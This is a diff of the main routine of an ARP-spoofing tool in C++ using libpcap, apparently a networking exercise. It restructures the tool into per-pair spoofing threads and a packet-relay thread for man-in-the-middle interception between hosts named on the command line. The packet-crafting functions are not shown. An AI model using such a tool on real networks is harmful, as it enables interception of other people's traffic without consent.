@@ -3,7 +3,13 @@
 #include <pcap.h>
 #include <string>
 #include <pthread.h>
+#include <iostream>
 #include "arp-spoof.h"
+
+Mac myMac;
+Ip myIp;
+pcap_t* pcap;
+std::vector<SpoofPair> spoofpairs;
 
 void usage() {
     printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
@@ -17,64 +23,36 @@ int main(int argc, char* argv[]) {
     }
 
     const char* dev = argv[1];
-
-    if (!getMyInfo(dev)) {
-        fprintf(stderr, "[-] Failed to get my MAC/IP\n");
-        return -1;
-    }
+    if (!getMyInfo(dev)) return -1;
 
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
     if (pcap == nullptr) {
-        fprintf(stderr, "[-] Couldn't open device %s(%s)\n", dev, errbuf);
+        std::cerr << "[-] Couldn't open device: " << errbuf << std::endl;
         return -1;
     }
 
     for (int i = 2; i < argc; i += 2) {
         Ip senderIp(argv[i]);
         Ip targetIp(argv[i + 1]);
-        Mac senderMac;
-        Mac targetMac;
+        Mac senderMac, targetMac;
 
-        if (!getMac(pcap, senderMac, senderIp)) {
-            fprintf(stderr, "[-] Failed to get sender MAC for %s\n", std::string(senderIp).c_str());
-            continue;
-        }
+        if (!getMac(pcap, senderMac, senderIp)) continue;
+        if (!getMac(pcap, targetMac, targetIp)) continue;
 
-        if (!getMac(pcap, targetMac, targetIp)) {
-            fprintf(stderr, "[-] Failed to get target MAC\n");
-            continue;
-        }
-
-        SpoofPair spoofpair;
-        spoofpair.senderIp = senderIp;
-        spoofpair.targetIp = targetIp;
-        spoofpair.senderMac = senderMac;
-        spoofpair.targetMac = targetMac;
-
-        if (!sendArpSpoof(spoofpair)) {
-            fprintf(stderr, "[-] Failed to send ARP spoof packet\n");
-            continue;
-        }
-
-        spoofpairs.push_back(spoofpair);
+        spoofpairs.push_back({senderIp, targetIp, senderMac, targetMac});
     }
 
-    printf("[+] Ready to relay packets\n");
-
-    pthread_t tid;
-    pthread_create(&tid, nullptr, infectThread, nullptr);
-
-    while (true) {
-        struct pcap_pkthdr* header;
-        const u_char* packet;
-        int res = pcap_next_ex(pcap, &header, &packet);
-        if (res == 0) continue;
-        if (res == -1 || res == -2) break;
-
-        relayPacket(packet, header->caplen);
-        detectRecoverAndReinfect(packet, header->caplen);
+    for (const auto& pair : spoofpairs) {
+        FlowContext* ctx = new FlowContext{ pair, pcap };
+        pthread_t tid;
+        pthread_create(&tid, nullptr, spoofThread, ctx);
     }
 
+    pthread_t relayTid;
+    pthread_create(&relayTid, nullptr, relayThread, nullptr);
+    pthread_join(relayTid, nullptr);
     pcap_close(pcap);
+    return 0;
 }
+
